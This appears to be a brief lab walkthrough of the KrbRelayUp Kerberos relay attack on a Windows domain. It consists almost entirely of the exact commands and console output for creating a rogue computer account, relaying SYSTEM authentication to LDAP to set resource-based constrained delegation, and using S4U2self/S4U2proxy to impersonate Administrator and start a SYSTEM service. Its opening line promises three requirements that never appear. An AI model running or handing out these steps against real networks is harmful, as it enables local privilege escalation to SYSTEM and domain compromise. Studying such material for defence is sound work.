There are 3 requirement to make successfull this attack method


	PS C:\Users\testuser\Desktop> .\KrbRelayUp.exe relay -Domain valhalla.local -CreateNewComputerAccount -ComputerName evilhost$ -ComputerPassword Pass123!
	KrbRelayUp - Relaying you to SYSTEM
	
	[+] Computer account "evilhost$" added with password "Pass123!"
	[+] Rewriting function table
	[+] Rewriting PEB
	[+] Init COM server
	[+] Register COM server
	[+] Forcing SYSTEM authentication
	[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
	[+] LDAP session established
	[+] RBCD rights added successfully
	[+] Run the spawn method for SYSTEM shell:
		./KrbRelayUp spawn -d valhalla.local -cn evilhost$ -cp Pass123!
		

	PS C:\Users\testuser\Desktop> ./KrbRelayUp spawn -d valhalla.local -cn evilhost$ -cp Pass123!
	KrbRelayUp - Relaying you to SYSTEM

	[+] TGT request successful!
	[+] Ticket successfully imported!
	[+] Building S4U2self
	[*] Using domain controller: odin.valhalla.local (192.168.200.100)
	[+] Sending S4U2self request to 192.168.200.100:88
	[+] S4U2self success!
	[+] Got a TGS for 'Administrator' to 'evilhost$@VALHALLA.LOCAL'
	[+] Impersonating user 'Administrator' to target SPN 'HOST/THOR'
	[+] Building S4U2proxy request for service: 'HOST/THOR'
	[*] Using domain controller: odin.valhalla.local (192.168.200.100)
	[+] Sending S4U2proxy request to domain controller 192.168.200.100:88
	[+] S4U2proxy success!
	[+] Ticket successfully imported!
	[+] Using ticket to connect to Service Manger
	[+] AcquireCredentialsHandleHook called for package N
	[+] Changing to Kerberos package
	[+] InitializeSecurityContextHook called for target H
	[+] InitializeSecurityContext status = 0x00090312
	[+] InitializeSecurityContextHook called for target H
	[+] InitializeSecurityContext status = 0x00000000
	[+] KrbSCM Service created
	[+] KrbSCM Service started
	[+] Clean-up done